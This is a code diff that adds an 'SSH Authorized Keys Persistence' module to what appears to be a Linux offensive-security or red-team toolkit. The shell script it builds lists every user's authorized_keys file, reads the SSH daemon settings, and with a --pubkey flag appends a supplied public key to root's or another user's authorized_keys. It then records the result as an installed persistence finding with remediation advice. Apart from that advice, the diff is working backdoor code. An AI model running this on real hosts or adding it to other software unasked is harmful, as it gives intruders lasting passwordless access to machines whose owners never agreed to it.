@@ -236,3 +236,69 @@ done
 
   return { output: output.join("\n"), findings }
 }
+
+export async function sshAuthorizedKeys(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== SSH Authorized Keys Persistence ==="]
+  const pubkey = argVal(args, "--pubkey")
+  const targetUser = argVal(args, "--target-user")
+
+  const script = `
+echo "--- Existing Authorized Keys ---"
+for dir in /root /home/*; do
+  if [ -f "$dir/.ssh/authorized_keys" ]; then
+    count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
+    writable=$([ -w "$dir/.ssh/authorized_keys" ] && echo "WRITABLE" || echo "read-only")
+    echo "  $dir/.ssh/authorized_keys: $count key(s) ($writable)"
+  elif [ -d "$dir" ]; then
+    sshdir_writable=$([ -w "$dir" ] && echo "home-writable" || echo "home-read-only")
+    echo "  $dir: no authorized_keys ($sshdir_writable)"
+  fi
+done
+echo ""
+echo "--- SSHD Config ---"
+grep -iE "^(AuthorizedKeysFile|PermitRootLogin|PubkeyAuthentication|PasswordAuthentication)" /etc/ssh/sshd_config 2>/dev/null
+echo ""
+${pubkey ? `
+echo "--- Installing SSH Key Persistence ---"
+target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
+mkdir -p "$target_dir/.ssh" 2>/dev/null
+chmod 700 "$target_dir/.ssh" 2>/dev/null
+echo "${pubkey}" >> "$target_dir/.ssh/authorized_keys" 2>/dev/null && echo "[+] Key added to $target_dir/.ssh/authorized_keys" || echo "[-] Failed to write authorized_keys"
+chmod 600 "$target_dir/.ssh/authorized_keys" 2>/dev/null
+` : `echo "[*] Dry run — pass --pubkey <ssh-rsa ...> to install. Use --target-user <user> to target."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Key added")) {
+    findings.push({
+      checkId: "LNX-AUTHKEYS-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "ssh_authorized_keys",
+      title: "SSH authorized_keys persistence installed",
+      details: "SSH public key added to authorized_keys — passwordless SSH access established",
+      remediation: "Audit authorized_keys files for all users. Remove unauthorized keys. Consider using AuthorizedKeysCommand for centralized management.",
+    })
+  }
+
+  const writableHomes = (r.stdout.match(/home-writable/g) || []).length
+  if (writableHomes > 0) {
+    findings.push({
+      checkId: "LNX-AUTHKEYS-002",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "IDENTIFIED",
+      resource: "ssh_authorized_keys",
+      title: "Writable home directories without SSH keys",
+      details: `${writableHomes} user home(s) are writable and have no authorized_keys — SSH key persistence possible`,
+      remediation: "Restrict home directory permissions. Monitor authorized_keys file changes.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
